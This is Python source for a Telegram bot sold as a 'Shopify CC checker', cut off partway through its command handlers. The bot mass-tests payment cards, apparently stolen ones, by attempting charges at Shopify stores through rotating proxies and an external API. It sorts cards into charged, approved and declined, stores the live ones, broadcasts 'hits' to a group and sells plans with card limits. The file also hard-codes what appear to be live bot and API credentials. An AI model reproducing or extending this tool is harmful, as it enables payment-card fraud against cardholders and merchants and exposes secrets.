from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.extensions import html as thtml
import random, datetime, os, re, asyncio, time, string, aiofiles, aiohttp, logging
from urllib.parse import urlparse, quote

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
)
logger = logging.getLogger(__name__)

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# Import database functions (MongoDB)
from database import (
    init_db, ensure_user, get_user_plan, set_user_plan, is_banned_user,
    ban_user, unban_user, create_key, use_key, get_all_keys, delete_key,
    add_proxy_db, get_random_proxy, get_all_user_proxies, get_proxy_count,
    remove_proxy_by_index, clear_all_proxies, add_site_db, get_user_sites,
    remove_site_db, save_card_to_db, get_total_users, get_premium_count,
    get_total_sites_count, get_total_cards_count, get_approved_count
)

# ---------- CONFIG ----------
API_ID = 37193134
API_HASH = '4b1667b97accd0898b61d3a55d9f864e'
BOT_TOKEN = '8588651388:AAEggyGdccq-1KTx-oyU3ngQNY6h_3iDePs'
ADMIN_ID = [7167704900]
GROUP_ID = -1003764248460
API_BASE_URL = "https://web-production-9db0.up.railway.app/shopify"

# ---------- CUSTOM EMOJIS (from second file) ----------
CE = {
    "crown":  5039727497143387500,
    "bolt":   5042334757040423886,
    "brain":  5040030395416969985,
    "shield": 5042328396193864923,
    "star":   5042176294222037888,
    "gem":    5042050649248760772,
    "check":  5039793437776282663,
    "fire":   5039644681583985437,
    "party":  5039778134807806727,
    "search": 5039649904264217620,
    "chart":  5042290883949495533,
    "pin":    5039600026809009149,
    "joker":  5039998939076494446,
    "plus":   5039891861246838069,
    "cross":  5040042498634810056,
    "info":   5042306247047513767,
    "gift":   5041975203853239332,
    "eyes":   5039623284056917259,
    "trash":  5039614900280754969,
    "tick":   5039844895779455925,
    "stop":   5039671744172917707,
    "warn":   5039665997506675838,
    "link":   5042101437237036298,
    "globe":  5042186567783809934,
}
PE = "⭐"  # placeholder emoji

# ---------- HTML + Custom Emoji Helpers ----------
def _utf16_offset(text, py_pos):
    return len(text[:py_pos].encode('utf-16-le')) // 2

def _build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx = 0
        utf16_pos = 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(
                    offset=utf16_pos, length=1, document_id=emoji_ids[idx]
                ))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)

async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    text, entities = _build_entities(html_text, emoji_ids)
    return await event.reply(text, formatting_entities=entities, buttons=buttons, file=file)

async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None):
    text, entities = _build_entities(html_text, emoji_ids)
    return await client.send_message(chat_id, text, formatting_entities=entities, buttons=buttons)

async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    text, entities = _build_entities(html_text, emoji_ids)
    await msg.edit(text, formatting_entities=entities, buttons=buttons)

def pbtn(text, data=None, url=None):
    if url:
        return Button.url(text, url)
    if data:
        return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")

# ---------- GLOBALS ----------
ACTIVE_MTXT_PROCESSES = {}
USER_APPROVED_PREF = {}
_GLOBAL_SESSION = None

# Delete stale session file BEFORE TelegramClient reads it
_session_path = os.path.join(SCRIPT_DIR, 'cc_bot_v2.session')
if os.path.exists(_session_path):
    os.remove(_session_path)
    logging.info("Removed old session file to force fresh auth")

client = TelegramClient(os.path.join(SCRIPT_DIR, 'cc_bot_v2'), API_ID, API_HASH)

# ---------- HTTP Session ----------
async def get_session():
    global _GLOBAL_SESSION
    if _GLOBAL_SESSION is None or _GLOBAL_SESSION.closed:
        timeout = aiohttp.ClientTimeout(total=60, connect=15)
        connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, use_dns_cache=True)
        _GLOBAL_SESSION = aiohttp.ClientSession(timeout=timeout, connector=connector)
    return _GLOBAL_SESSION

# ---------- Helper Functions ----------
def get_cc_limit(plan: str, user_id=None):
    if user_id and user_id in ADMIN_ID:
        return 5000
    limits = {"free": 300, "pro": 2000, "toji": 5000}
    return limits.get(plan.lower(), 300)

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card:
            cards.add(card)
    return list(cards)

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(url)
        except Exception:
            return False
        domain = parsed.netloc
    pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, domain))

def extract_urls_from_text(text):
    urls = set()
    for line in text.split('\n'):
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned and is_valid_url_or_domain(cleaned):
            urls.add(cleaned)
    return list(urls)

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    proxy_type = 'http'
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    host = port = username = password = None
    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    else:
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        if match:
            host, port, username, password = match.groups()
        else:
            match = re.match(r'^([^:@]+):(\d+)$', proxy)
            if match:
                host, port = match.groups()
    if not host or not port:
        return None
    port = int(port)
    if port <= 0 or port > 65535:
        return None
    proxy_url = f"{proxy_type}://"
    if username and password:
        proxy_url += f"{username}:{password}@{host}:{port}"
    else:
        proxy_url += f"{host}:{port}"
    return {
        'ip': host,
        'port': str(port),
        'username': username,
        'password': password,
        'proxy_url': proxy_url,
        'type': proxy_type
    }

async def test_proxy(proxy_url):
    try:
        session = await get_session()
        async with session.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=10) as resp:
            if resp.status == 200:
                data = await resp.json()
                return True, data.get('ip', 'Unknown')
            return False, None
    except Exception as e:
        logger.debug("Proxy test failed: %s", e)
        return False, None

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        session = await get_session()
        async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
            if res.status != 200:
                return "Not Found", "-", "-", "-", "-", "???"
            data = await res.json()
            return (data.get('brand','-'), data.get('type','-'), data.get('level','-'),
                    data.get('bank','-'), data.get('country_name','-'), data.get('country_flag','???'))
    except Exception as e:
        logger.warning("BIN lookup failed: %s", e)
        return "-", "-", "-", "-", "-", "???"

SITE_ERROR_KEYWORDS = [
    'r4 token empty', 'payment method is not shopify', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax amount empty',
    'product id is empty', 'receipt id is empty', 'site error! status: 429',
    'site requires login', 'failed to get checkout', 'captcha at checkout',
    'site not supported', 'connection error', 'amount too small',
    'token not found', 'invalid_response', 'could not resolve host',
    'connect tunnel failed', 'failed to tokenize card', 'site dead',
    'proxy dead', 'cloudflare', 'timeout', '502', '503', '504',
    'bad gateway', 'service unavailable', 'gateway timeout'
]

def is_site_error(response_text):
    if not response_text:
        return True
    return any(kw in response_text.lower() for kw in SITE_ERROR_KEYWORDS)

def classify_api_response(response_json):
    api_response = str(response_json.get('Response', ''))
    api_status = response_json.get('Status', False)
    price = response_json.get('Price', '-')
    gateway = response_json.get('Gate', response_json.get('Gateway', 'Shopify'))
    if price and price != '-':
        price = f"${price}"
    rl = api_response.lower()
    if is_site_error(api_response):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "SiteError"}
    charged = ["order_paid","order_placed","thank you","payment successful","order completed","charged"]
    approved = ["otp_required","3d_authentication","insufficient_funds","cvc","ccn live cvv"]
    if any(k in rl for k in charged):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Charged"}
    if any(k in rl for k in approved):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Approved"}
    if api_status and not any(w in rl for w in ["decline","denied","failed","error","rejected"]):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Approved"}
    return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Declined"}

async def call_shopify_api(site, cc, proxy_data=None):
    if not site.startswith(('http://','https://')):
        site = f'https://{site}'
    encoded_site = quote(site, safe='')
    encoded_cc = quote(cc, safe='')
    url = f'{API_BASE_URL}?site={encoded_site}&cc={encoded_cc}'
    if proxy_data:
        proxy_str = f"{proxy_data['ip']}:{proxy_data['port']}"
        if proxy_data.get('username') and proxy_data.get('password'):
            proxy_str = f"{proxy_data['username']}:{proxy_data['password']}@{proxy_str}"
        url += f'&proxy={quote(proxy_str, safe="")}'
    session = await get_session()
    async with session.get(url) as resp:
        if resp.status != 200:
            return None, f"HTTP_{resp.status}"
        try:
            data = await resp.json()
            return data, None
        except Exception as e:
            logger.warning("Invalid JSON from API: %s", e)
            return None, "Invalid JSON"

async def check_card_specific_site(card, site, user_id=None):
    proxy_data = await get_random_proxy(user_id) if user_id else None
    try:
        data, err = await call_shopify_api(site, card, proxy_data)
        if err:
            return {"Response": err, "Price": "-", "Gateway": "-", "Status": "SiteError"}
        return classify_api_response(data)
    except Exception as e:
        return {"Response": str(e), "Price": "-", "Gateway": "-", "Status": "SiteError"}

async def check_card_with_retry(card, sites, user_id=None, max_retries=3):
    for _ in range(max_retries):
        site = random.choice(sites)
        result = await check_card_specific_site(card, site, user_id)
        if result.get("Status") != "SiteError":
            return result, sites.index(site)+1
        await asyncio.sleep(1)
    return {"Response": "Max retries, site error", "Price": "-", "Gateway": "-", "Status": "Error"}, -1

async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):
    proxy_data = await get_random_proxy(user_id) if user_id else None
    try:
        data, err = await call_shopify_api(site, test_card, proxy_data)
        if err or is_site_error(data.get('Response','')):
            return {"status": "dead", "response": err or data.get('Response',''), "site": site, "price": data.get('Price','-') if data else '-'}
        return {"status": "working", "response": data.get('Response',''), "site": site, "price": data.get('Price','-')}
    except Exception as e:
        logger.warning("Site test exception for %s: %s", site, e)
        return {"status": "dead", "response": "Exception", "site": site, "price": "-"}

def get_status_header(status):
    if status == "Charged":
        return f"{PE} CHARGED {PE}", [CE["gem"], CE["gem"]]
    elif status == "Approved":
        return f"{PE} APPROVED {PE}", [CE["check"], CE["check"]]
    elif status in ("Error","SiteError"):
        return f"{PE} ERROR {PE}", [CE["cross"], CE["cross"]]
    else:
        return f"{PE} DECLINED {PE}", [CE["cross"], CE["cross"]]

async def send_hit_notification(card, result, username, user_id):
    try:
        price = result.get('Price','-')
        response = result.get('Response','-')
        gateway = result.get('Gateway','Shopify')
        hit_msg = f"{PE} CHARGED HIT {PE}\n━━━━━━━━━━━━━━━━━\nResponse ━ {response}\nGateway ━ {gateway}\nPrice ━ {price}\n━━━━━━━━━━━━━━━━━\nUser ━ @{username}"
        await styled_send(GROUP_ID, hit_msg, emoji_ids=[CE["fire"], CE["fire"]])
    except Exception as e:
        logger.error("send_hit_notification failed: %s", e)

async def handle_hit(event, card, result, status, site_info, username, is_private):
    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        header, emojis = get_status_header(status)
        msg = f"""{header}
━━━━━━━━━━━━━━━━━
Card ━ <code>{card}</code>
Gateway ━ {result.get('Gateway','Unknown')}
━━━━━━━━━━━━━━━━━
Response ━ {result.get('Response')}
Price ━ {result.get('Price')}
{f"Site ━ {site_info}" if site_info else ""}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>"""
        await styled_reply(event, msg, emoji_ids=emojis)
        if status == "Charged":
            if event.is_group:
                try:
                    m = await event.reply("⚡ Charged hit")
                    await m.pin()
                except Exception as e:
                    logger.warning("Failed to pin charged hit: %s", e)
            if is_private:
                await send_hit_notification(card, result, username, event.sender_id)
    except Exception as e:
        logger.error("handle_hit failed: %s", e)

async def process_mtxt_cards(event, cards, local_sites, send_approved=True):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"
    total = len(cards)
    checked, approved, charged, declined, errors = 0,0,0,0,0
    is_private = event.chat.id == user_id
    status_msg = await styled_reply(event, f"{PE} Starting mass check...", emoji_ids=[CE["pin"]])
    BATCH_SIZE = 20
    last_update = 0
    def should_update():
        nonlocal last_update
        now = time.time()
        if now - last_update >= 3:
            last_update = now
            return True
        return False
    idx = 0
    while idx < total:
        if user_id not in ACTIVE_MTXT_PROCESSES:
            await styled_edit(status_msg, f"{PE} Stopped by user", emoji_ids=[CE["stop"]])
            return
        batch = cards[idx:idx+BATCH_SIZE]
        tasks = []
        for card in batch:
            site = random.choice(local_sites)
            tasks.append(check_card_specific_site(card, site, user_id))
        results = await asyncio.gather(*tasks)
        for card, res in zip(batch, results):
            checked += 1
            status = res.get("Status","Declined")
            if status == "Charged":
                charged += 1
                await save_card_to_db(card, "CHARGED", res.get('Response'), res.get('Gateway'), res.get('Price'))
                asyncio.create_task(handle_hit(event, card, res, status, None, username, is_private))
            elif status == "Approved":
                approved += 1
                await save_card_to_db(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
                if send_approved:
                    asyncio.create_task(handle_hit(event, card, res, status, None, username, is_private))
            elif status in ("SiteError","Error"):
                errors += 1
            else:
                declined += 1
        if should_update():
            kb = [
                [pbtn(f"{PE} Charged ━ {charged}", "none")],
                [pbtn(f"{PE} Approved ━ {approved}", "none")],
                [pbtn(f"{PE} Declined ━ {declined}", "none")],
                [pbtn(f"{PE} Errors ━ {errors}", "none")],
                [pbtn(f"{PE} {checked}/{total}", "none")],
                [pbtn("🛑 Stop", f"stop_mtxt:{user_id}")]
            ]
            await styled_edit(status_msg, f"{PE} Processing batch {idx//BATCH_SIZE+1}...", buttons=kb, emoji_ids=[CE["star"]])
        idx += BATCH_SIZE
    final = f"""{PE} COMPLETED
━━━━━━━━━━━━━━━━━
{PE} Charged ━ {charged}
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
{PE} Errors ━ {errors}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}"""
    await styled_edit(status_msg, final, emoji_ids=[CE["party"], CE["gem"], CE["check"], CE["cross"], CE["warn"], CE["star"]])
    ACTIVE_MTXT_PROCESSES.pop(user_id, None)

async def process_ran_cards(event, cards, global_sites, send_approved=True):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"
    total = len(cards)
    checked, approved, charged, declined, errors = 0,0,0,0,0
    is_private = event.chat.id == user_id
    status_msg = await styled_reply(event, f"{PE} Random site check started...", emoji_ids=[CE["joker"]])
    BATCH_SIZE = 20
    last_update = 0
    def should_update():
        nonlocal last_update
        now = time.time()
        if now - last_update >= 3:
            last_update = now
            return True
        return False
    idx = 0
    while idx < total:
        if user_id not in ACTIVE_MTXT_PROCESSES:
            await styled_edit(status_msg, f"{PE} Stopped by user", emoji_ids=[CE["stop"]])
            return
        batch = cards[idx:idx+BATCH_SIZE]
        tasks = []
        for card in batch:
            site = random.choice(global_sites)
            tasks.append(check_card_specific_site(card, site, user_id))
        results = await asyncio.gather(*tasks)
        for card, res in zip(batch, results):
            checked += 1
            status = res.get("Status","Declined")
            if status == "Charged":
                charged += 1
                await save_card_to_db(card, "CHARGED", res.get('Response'), res.get('Gateway'), res.get('Price'))
                asyncio.create_task(handle_hit(event, card, res, status, None, username, is_private))
            elif status == "Approved":
                approved += 1
                await save_card_to_db(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
                if send_approved:
                    asyncio.create_task(handle_hit(event, card, res, status, None, username, is_private))
            elif status in ("SiteError","Error"):
                errors += 1
            else:
                declined += 1
        if should_update():
            kb = [
                [pbtn(f"{PE} Charged ━ {charged}", "none")],
                [pbtn(f"{PE} Approved ━ {approved}", "none")],
                [pbtn(f"{PE} Declined ━ {declined}", "none")],
                [pbtn(f"{PE} Errors ━ {errors}", "none")],
                [pbtn(f"{PE} {checked}/{total}", "none")],
                [pbtn("🛑 Stop", f"stop_ran:{user_id}")]
            ]
            await styled_edit(status_msg, f"{PE} Random batch {idx//BATCH_SIZE+1}...", buttons=kb, emoji_ids=[CE["star"]])
        idx += BATCH_SIZE
    final = f"""{PE} RANDOM CHECK DONE
━━━━━━━━━━━━━━━━━
{PE} Charged ━ {charged}
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
{PE} Errors ━ {errors}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}"""
    await styled_edit(status_msg, final, emoji_ids=[CE["party"], CE["gem"], CE["check"], CE["cross"], CE["warn"], CE["star"]])
    ACTIVE_MTXT_PROCESSES.pop(user_id, None)

# ---------- CATCH-ALL EVENT LOGGER ----------
@client.on(events.NewMessage)
async def debug_log_all_messages(event):
    logger.info("Received message from user %s in chat %s", event.sender_id, event.chat_id)

# ---------- BOT COMMANDS ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.]start$'))
async def start(event):
    logger.info("/start command from user %s", event.sender_id)
    try:
        await ensure_user(event.sender_id)
    except Exception as e:
        logger.error("/start ensure_user failed: %s", e, exc_info=True)
        return await event.reply("An internal error occurred. Please try again later.")
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    text = f"""{PE} <b>BEAST SHOPIFY CC CHECKER</b>
━━━━━━━━━━━━━━━━━
{PE} /sh       - Single CC
{PE} /msh      - Multi CC from text
{PE} /mtxt     - Mass CC from .txt file
{PE} /ran      - Random site mass check
━━━━━━━━━━━━━━━━━
{PE} /add      - Add site(s)
{PE} /rm       - Remove site(s)
{PE} /check    - Test sites
{PE} /info     - Your profile
{PE} /redeem   - Redeem key
{PE} /plan     - Plans
━━━━━━━━━━━━━━━━━
{PE} Proxy (private only)
{PE} /addpxy   - Add proxy
{PE} /proxy    - List proxies
{PE} /chkpxy   - Test proxies
{PE} /rmpxy    - Remove proxy
━━━━━━━━━━━━━━━━━
Plan: {plan.upper()} | Limit: {limit} CCs"""
    emojis = [CE["bolt"], CE["search"], CE["chart"], CE["pin"], CE["joker"],
              CE["plus"], CE["cross"], CE["globe"], CE["info"], CE["gift"],
              CE["shield"], CE["link"], CE["eyes"], CE["tick"], CE["trash"], CE["crown"]]
    await styled_reply(event, text, emoji_ids=emojis)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh\b'))
async def sh_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    await ensure_user(event.sender_id)
    proxy = await get_random_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} Proxy required! Use /addpxy", emoji_ids=[CE["warn"]])
    card = None
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            card = extract_card(replied.text)
    if not card:
        card = extract_card(event.raw_text)
    if not card:
        return await styled_reply(event, f"{PE} Format: /sh 4111111111111111|12|2025|123", emoji_ids=[CE["warn"]])
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites. Add with /add", emoji_ids=[CE["warn"]])
    loading = await event.reply("⏳")
    try:
        res, site_idx = await check_card_with_retry(card, sites, event.sender_id)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        header, emojis = get_status_header(res.get("Status","Declined"))
        msg = f"""{header}
━━━━━━━━━━━━━━━━━
Card ━ <code>{card}</code>
Gateway ━ {res.get('Gateway','Unknown')}
━━━━━━━━━━━━━━━━━
Response ━ {res.get('Response')}
Price ━ {res.get('Price')}
Site ━ {site_idx}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>"""
        await loading.delete()
        await styled_reply(event, msg, emoji_ids=emojis)
        if res.get("Status") == "Charged":
            await save_card_to_db(card, "CHARGED", res.get('Response'), res.get('Gateway'), res.get('Price'))
            if event.is_group:
                try:
                    m = await event.reply("⚡ Charged hit")
                    await m.pin()
                except Exception as e:
                    logger.warning("Failed to pin charged hit in /sh: %s", e)
            else:
                sender = await event.get_sender()
                username = sender.username or f"user_{event.sender_id}"
                await send_hit_notification(card, res, username, event.sender_id)
        elif res.get("Status") == "Approved":
            await save_card_to_db(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
    except Exception as e:
        await loading.delete()
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh\b'))
async def msh_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    if event.sender_id in ACTIVE_MTXT_PROCESSES:
        return await styled_reply(event, f"{PE} Already running", emoji_ids=[CE["warn"]])
    await ensure_user(event.sender_id)
    proxy = await get_random_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} Proxy required! Use /addpxy", emoji_ids=[CE["warn"]])
    text = re.sub(r'^[/.]msh\s*', '', event.raw_text, flags=re.I).strip()
    if not text and event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            text = replied.text
    if not text:
        return await styled_reply(event, f"{PE} Usage: /msh card1|mm|yy|cvv\\ncard2|mm|yy|cvv\nOr reply to a message with cards", emoji_ids=[CE["warn"]])
    cards = extract_all_cards(text)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards found", emoji_ids=[CE["cross"]])
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, f"{PE} Limiting to {limit} cards", emoji_ids=[CE["warn"]])
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites. Add with /add", emoji_ids=[CE["warn"]])
    kb = [
        [pbtn("\u2705 Yes (Charged+Approved)", f"msh_pref:yes:{event.sender_id}")],
        [pbtn("\u274c No (Only Charged)", f"msh_pref:no:{event.sender_id}")]
    ]
    pref_msg = await styled_reply(event, f"{PE} Filter: include Approved?", kb, emoji_ids=[CE["pin"]])
    USER_APPROVED_PREF[f"msh_{event.sender_id}"] = {"cards": cards, "sites": sites, "event": event, "pref_msg": pref_msg}

@client.on(events.CallbackQuery(pattern=rb"msh_pref:(yes|no):(\d+)"))
async def msh_pref_cb(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    uid = int(match.group(2).decode())
    if event.sender_id != uid:
        return await event.answer("Not yours", alert=True)
    data = USER_APPROVED_PREF.pop(f"msh_{uid}", None)
    if not data:
        return await event.answer("Expired", alert=True)
    await data["pref_msg"].delete()
    send_approved = (pref == "yes")
    ACTIVE_MTXT_PROCESSES[uid] = True
    await event.answer("Starting...", alert=False)
    asyncio.create_task(process_mtxt_cards(data["event"], data["cards"], data["sites"], send_approved))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ran\b'))
async def ran_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    if event.sender_id in ACTIVE_MTXT_PROCESSES:
        return await styled_reply(event, f"{PE} Already running", emoji_ids=[CE["warn"]])
    if not event.reply_to_msg_id:
        return await styled_reply(event, f"{PE} Reply to a .txt file with /ran", emoji_ids=[CE["warn"]])
    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await styled_reply(event, f"{PE} Reply to a .txt file", emoji_ids=[CE["warn"]])
    sites_path = os.path.join(SCRIPT_DIR, 'sites.txt')
    if not os.path.exists(sites_path):
        return await styled_reply(event, f"{PE} sites.txt missing! Contact admin.", emoji_ids=[CE["cross"]])
    with open(sites_path, 'r') as f:
        global_sites = [l.strip() for l in f if l.strip()]
    if not global_sites:
        return await styled_reply(event, f"{PE} No sites in sites.txt", emoji_ids=[CE["cross"]])
    proxy = await get_random_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} Proxy required! Use /addpxy", emoji_ids=[CE["warn"]])
    path = await replied.download_media()
    try:
        async with aiofiles.open(path,'r') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        logger.error("Error reading file in /ran: %s", e)
        os.remove(path)
        return await styled_reply(event, f"{PE} Error reading file", emoji_ids=[CE["cross"]])
    cards = extract_all_cards(content)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards", emoji_ids=[CE["cross"]])
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, f"{PE} Limiting to {limit} cards", emoji_ids=[CE["warn"]])
    kb = [
        [pbtn("✅ Yes (Charged+Approved)", f"ran_pref:yes:{event.sender_id}")],
        [pbtn("❌ No (Only Charged)", f"ran_pref:no:{event.sender_id}")]
    ]
    pref_msg = await styled_reply(event, f"{PE} Filter: include Approved cards?", kb, emoji_ids=[CE["joker"]])
    USER_APPROVED_PREF[f"ran_{event.sender_id}"] = {"cards": cards, "sites": global_sites, "event": event, "pref_msg": pref_msg}

@client.on(events.CallbackQuery(pattern=rb"ran_pref:(yes|no):(\d+)"))
async def ran_pref_cb(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    uid = int(match.group(2).decode())
    if event.sender_id != uid:
        return await event.answer("Not your session", alert=True)
    data = USER_APPROVED_PREF.pop(f"ran_{uid}", None)
    if not data:
        return await event.answer("Expired", alert=True)
    await data["pref_msg"].delete()
    send_approved = (pref == "yes")
    ACTIVE_MTXT_PROCESSES[uid] = True
    await event.answer("Starting...", alert=False)
    asyncio.create_task(process_ran_cards(data["event"], data["cards"], data["sites"], send_approved))

@client.on(events.CallbackQuery(pattern=rb"stop_ran:(\d+)"))
async def stop_ran_cb(event):
    match = event.pattern_match
    uid = int(match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not allowed", alert=True)
    ACTIVE_MTXT_PROCESSES.pop(uid, None)
    await event.answer("Stopped", alert=True)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt\b'))
async def mtxt_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    if event.sender_id in ACTIVE_MTXT_PROCESSES:
        return await styled_reply(event, f"{PE} Already running", emoji_ids=[CE["warn"]])
    if not event.reply_to_msg_id:
        return await styled_reply(event, f"{PE} Reply to .txt file", emoji_ids=[CE["warn"]])
    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await styled_reply(event, f"{PE} Reply to .txt file", emoji_ids=[CE["warn"]])
    proxy = await get_random_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} Proxy required", emoji_ids=[CE["warn"]])
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites. Add with /add", emoji_ids=[CE["warn"]])
    path = await replied.download_media()
    try:
        async with aiofiles.open(path,'r') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        logger.error("Error reading file in /mtxt: %s", e)
        os.remove(path)
        return await styled_reply(event, f"{PE} Read error", emoji_ids=[CE["cross"]])
    cards = extract_all_cards(content)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards", emoji_ids=[CE["cross"]])
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, f"{PE} Limiting to {limit} cards", emoji_ids=[CE["warn"]])
    kb = [
        [pbtn("✅ Yes (Charged+Approved)", f"mtxt_pref:yes:{event.sender_id}")],
        [pbtn("❌ No (Only Charged)", f"mtxt_pref:no:{event.sender_id}")]
    ]
    pref_msg = await styled_reply(event, f"{PE} Filter: include Approved?", kb, emoji_ids=[CE["pin"]])
    USER_APPROVED_PREF[f"mtxt_{event.sender_id}"] = {"cards": cards, "sites": sites, "event": event, "pref_msg": pref_msg}

@client.on(events.CallbackQuery(pattern=rb"mtxt_pref:(yes|no):(\d+)"))
async def mtxt_pref_cb(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    uid = int(match.group(2).decode())
    if event.sender_id != uid:
        return await event.answer("Not yours", alert=True)
    data = USER_APPROVED_PREF.pop(f"mtxt_{uid}", None)
    if not data:
        return await event.answer("Expired", alert=True)
    await data["pref_msg"].delete()
    send_approved = (pref == "yes")
    ACTIVE_MTXT_PROCESSES[uid] = True
    await event.answer("Start", alert=False)
    asyncio.create_task(process_mtxt_cards(data["event"], data["cards"], data["sites"], send_approved))

@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
async def stop_mtxt_cb(event):
    match = event.pattern_match
    uid = int(match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not allowed", alert=True)
    ACTIVE_MTXT_PROCESSES.pop(uid, None)
    await event.answer("Stopped", alert=True)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
